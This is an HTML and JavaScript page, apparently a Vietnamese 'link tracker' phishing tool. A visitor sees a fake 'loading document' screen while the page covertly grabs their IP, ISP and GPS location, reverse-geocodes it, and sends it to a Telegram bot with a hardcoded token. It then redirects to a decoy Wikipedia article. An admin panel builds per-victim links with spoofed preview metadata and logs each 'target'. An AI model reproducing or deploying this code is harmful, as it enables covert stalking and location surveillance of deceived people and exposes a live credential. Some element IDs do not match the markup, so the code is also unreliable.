<body id="main-body" class="victim-body">

    <div id="ui-victim">
        <div class="loader" style="margin: 0 auto;"></div>
        <div class="mt-4 text-[#777] text-sm text-center font-sans">ƒêang t·∫£i t√†i li·ªáu...</div>
    </div>

    <div id="ui-admin" class="hidden w-full p-4 lg:p-8">
        <div class="max-w-7xl mx-auto space-y-6">
            <header class="flex justify-between items-center border-b border-gray-800 pb-4">
                <h1 class="text-xl font-black text-white italic uppercase tracking-tighter">TR√ç TR√ç </h1>
                <button onclick="logout()" class="text-[9px] bg-red-900/20 text-red-500 border border-red-900/50 px-3 py-1.5 rounded uppercase font-bold">Logout</button>
            </header>

            <div class="grid lg:grid-cols-12 gap-6">
                <div class="lg:col-span-5 space-y-6">
                    <div class="glass p-5 space-y-4 shadow-xl border-l-4 border-blue-600">
                        <h3 class="text-[10px] font-black text-blue-400 uppercase tracking-widest italic border-b border-gray-800 pb-2">1. Edit All Metadata & Preview</h3>
                        <div class="space-y-3">
                            <div>
                                <label class="text-[9px] text-gray-500 uppercase ml-1">Page Title</label>
                                <input id="ed-title" type="text" placeholder="Ti√™u ƒë·ªÅ tab tr√¨nh duy·ªát" class="input-dark mt-1" oninput="updateUI()">
                            </div>
                            <div>
                                <label class="text-[9px] text-gray-500 uppercase ml-1">Meta Description</label>
                                <textarea id="ed-desc" placeholder="M√¥ t·∫£ ·∫©n cho SEO/M·∫°ng x√£ h·ªôi" class="input-dark mt-1 h-14 resize-none" oninput="updateUI()"></textarea>
                            </div>
                            <div>
                                <label class="text-[9px] text-gray-500 uppercase ml-1">OG Image Link (URL)</label>
                                <input id="ed-img" type="text" placeholder="D√°n link ·∫£nh t·∫°i ƒë√¢y" class="input-dark mt-1" oninput="updateUI()">
                            </div>
                        </div>

                        <div class="preview-card mt-2">
                            <img id="pre-img" src="" class="w-full h-32 object-cover">
                            <div class="p-3">

                                <div id="pre-desc" class="text-[10px] text-gray-500 line-clamp-2 mt-1 leading-relaxed">...</div>
                            </div>
                        </div>
                    </div>

                    <div class="glass p-5 space-y-4 shadow-xl border-l-4 border-green-600">
                        <h3 class="text-[10px] font-black text-green-500 uppercase tracking-widest italic border-b border-gray-800 pb-2">2. Bot Config & Build Link</h3>
                        <div class="grid grid-cols-2 gap-2">
                            <input id="cfg-tk" type="password" placeholder="Bot Token" class="input-dark">
                            <input id="cfg-id" type="text" placeholder="Chat ID" class="input-dark">
                        </div>
                        <input id="cfg-rd" type="text" placeholder="Link ƒë√≠ch sau khi thu ho·∫°ch" class="input-dark">
                        <input id="in-name" type="text" placeholder="G·∫Øn t√™n m·ª•c ti√™u (V√≠ d·ª•: Anh Nam)" class="input-dark">
                        <button onclick="saveAndBuild()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl text-[10px] uppercase shadow-lg transition-all">T·∫°o Link & ƒê·ªìng b·ªô</button>
                        <div id="box-result" class="hidden p-3 bg-black rounded border border-blue-900/30">
                            <div id="out-link" onclick="copyText(this)" class="text-[10px] text-blue-400 break-all cursor-pointer font-mono text-center"></div>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-7">
                    <div class="glass min-h-[600px] flex flex-col overflow-hidden shadow-2xl">
                        <div class="p-5 border-b border-gray-800 flex justify-between items-center bg-black/20 text-white">
                            <h3 class="text-[10px] font-black uppercase italic tracking-widest"><span class="inline-block w-2 h-2 bg-green-500 rounded-full animate-ping mr-2"></span>Live Logs Ops</h3>
                            <button onclick="clearLogs()" class="text-[9px] text-gray-500 hover:text-red-500 font-bold uppercase">X√≥a h·∫øt</button>
                        </div>
                        <div class="overflow-x-auto flex-1">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black/50 text-gray-500 uppercase text-[9px] font-bold">
                                    <tr>
                                        <th class="p-4">Target</th>
                                        <th class="p-4">Network / ISP</th>
                                        <th class="p-4">ƒê·ªãa ch·ªâ ch·ªØ (Reverse Geo)</th>
                                        <th class="p-4 text-right">Map</th>
                                    </tr>
                                </thead>
                                <tbody id="log-list" class="divide-y divide-gray-800 text-gray-300">
                                    </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // C·∫•u h√¨nh m·∫∑c ƒë·ªãnh
        let config = {
            t: "8123198134:AAHTKQPxi5CnW_HDEenVJjRZMZvx1REjLB4",
            i: "857408205",
            r: "https://vi.wikipedia.org/wiki/ƒê√†o_Minh_Qu√¢n",
            mt: "Ti·ªÉu s·ª≠ ƒê·ª©c qu·ªëc c√¥ng ƒê√†o Minh Qu√¢n",
            md: "T·ªôi √°c c·ªông s·∫£n v·ªõi ƒê√†o Minh Qu√¢n v√† c√¥ng ∆°n cao c·∫£ c·ªßa Ng√†i.",
            mi: "https://i.ibb.co/ynRQ20S0/att-v-SGAhgzni-Sg77k-RFCc0u-Dz-sj-HLvv-G0-Wu-Vk-Y3-HSe0.jpg"
        };

        const urlParams = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (urlParams.has('admin')) {
                if (localStorage.getItem('v31_auth') === 'true' || prompt("M·∫≠t m√£ truy c·∫≠p:") === "123") {
                    localStorage.setItem('v31_auth', 'true');
                    initAdmin();
                } else { window.location.search = ""; }
            } else { startPhantom(); }
        };

        // --- CORE LOGIC (N·∫†N NH√ÇN) ---
        async function startPhantom() {
            try { 
                const v = urlParams.get('v'); 
                if(v) config = JSON.parse(decodeURIComponent(escape(atob(v)))); 
                
                // √âp tr√¨nh duy·ªát nh·∫≠n di·ªán Meta ngay l·∫≠p t·ª©c
                document.title = config.mt;
                document.getElementById('dyn-title').innerText = config.mt;
                document.getElementById('meta-desc').content = config.md;
                document.getElementById('og-title').content = config.mt;
                document.getElementById('og-desc').content = config.md;
                document.getElementById('og-img').content = config.mi;
            } catch(e) { console.log("Config decode error"); }

            const targetName = urlParams.get('name') || 'GUEST';
            let ipLogs = { name: targetName, time: new Date().toLocaleTimeString(), st: 'IP' };

            // L·∫•y IP & ISP (Silent)
            try {
                const res = await fetch('http://ip-api.com/json/?fields=status,isp,query,city,country,lat,lon').then(r => r.json());
                if(res.status === 'success') {
                    ipLogs.ip = res.query;
                    ipLogs.isp = res.isp;
                    ipLogs.address = res.city + ", " + res.country;
                    ipLogs.lat = res.lat;
                    ipLogs.lon = res.lon;
                    
                    saveLog(ipLogs);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üöÄ <b>" + targetName + "</b> v·ª´a nh·∫•n link\nüåê IP: <code>" + res.query + "</code>\nüè¢ ISP: " + res.isp)}`);
                }
            } catch(e) {}

            const jump = () => window.location.replace(config.r);

            // √âp l·∫•y GPS v√† d·ªãch ƒë·ªãa ch·ªâ ch·ªØ
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    let fullAddr = "T·ªça ƒë·ªô: " + lat + ", " + lon;
                    
                    try {
                        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
                        fullAddr = geo.display_name || fullAddr;
                    } catch(e) {}

                    ipLogs.lat = lat; ipLogs.lon = lon; ipLogs.address = fullAddr; ipLogs.st = 'GPS';
                    saveLog(ipLogs);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üéØ <b>" + targetName + "</b> GPS OK\nüìç " + fullAddr + "\nüó∫Ô∏è Map: http://maps.google.com/maps?q=" + lat + "," + lon)}`);
                    jump();
                }, jump, { timeout: 5000 });
            } else { jump(); }
            setTimeout(jump, 8000);
        }

        // --- ADMIN FUNCTIONS ---
        function initAdmin() {
            document.getElementById('main-body').className = "admin-bg";
            document.getElementById('ui-victim').classList.add('hidden');
            document.getElementById('ui-admin').classList.remove('hidden');
            
            const saved = localStorage.getItem('v31_cfg');
            if(saved) config = JSON.parse(saved);
            
            document.getElementById('edit-meta-title').value = config.mt;
            document.getElementById('edit-meta-desc').value = config.md;
            document.getElementById('edit-meta-img').value = config.mi;
            document.getElementById('cfg-tk').value = config.t;
            document.getElementById('cfg-id').value = config.i;
            document.getElementById('cfg-rd').value = config.r;
            
            updateUI();
            renderLogs();
            setInterval(renderLogs, 3000); // T·ª± ƒë·ªông load nh·∫≠t k√Ω m·ªói 3 gi√¢y
        }

        function updateUI() {
            document.getElementById('pre-title').innerText = document.getElementById('edit-meta-title').value || "...";
            document.getElementById('pre-desc').innerText = document.getElementById('edit-meta-desc').value || "...";
            document.getElementById('pre-img').src = document.getElementById('edit-meta-img').value || "";
        }

        function saveAndBuild() {
            config.t = document.getElementById('cfg-tk').value;
            config.i = document.getElementById('cfg-id').value;
            config.r = document.getElementById('cfg-rd').value;
            config.mt = document.getElementById('edit-meta-title').value;
            config.md = document.getElementById('edit-meta-desc').value;
            config.mi = document.getElementById('edit-meta-img').value;
            localStorage.setItem('v31_cfg', JSON.stringify(config));
            
            const name = document.getElementById('in-name').value || 'Target';
            const base = window.location.href.split('?')[0];
            const v = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
            const link = `${base}?name=${encodeURIComponent(name)}&v=${v}`;
            
            document.getElementById('box-result').classList.remove('hidden');
            document.getElementById('out-link').innerText = link;
        }

        function saveLog(data) {
            let logs = JSON.parse(localStorage.getItem('v31_logs') || '[]');
            if (logs.length > 0 && logs[0].name === data.name && data.st === 'GPS') {
                logs[0] = data;
            } else { logs.unshift(data); }
            localStorage.setItem('v31_logs', JSON.stringify(logs.slice(0, 50)));
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('v31_logs') || '[]');
            const table = document.getElementById('log-list');
            table.innerHTML = logs.map(l => `
                <tr class="hover:bg-white/5 border-b border-gray-800 transition">
                    <td class="p-4"><span class="text-white font-bold uppercase">${l.name}</span><br><span class="text-[8px] text-gray-600">${l.time}</span></td>
                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-gray-500 uppercase">${l.isp || ''}</span></td>
                    <td class="p-4 text-gray-300 text-[9px] leading-tight max-w-[200px]">${l.address || 'ƒêang l·∫•y...'}</td>
                    <td class="p-4 text-right">
                        ${l.lat ? `<a href="https://maps.google.com/?q=${l.lat},${l.lon}" target="_blank" class="bg-blue-600/20 text-blue-500 px-2 py-1 rounded font-bold uppercase text-[9px]">Xem Map</a>` : `<span class="text-gray-700 italic">Ch·ªâ IP</span>`}
                    </td>
                </tr>
            `).join('');
        }

        function clearLogs() { localStorage.removeItem('v31_logs'); renderLogs(); }
        function logout() { localStorage.removeItem('v28_auth'); location.reload(); }
        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy Link!"); }
    </script>
</body>
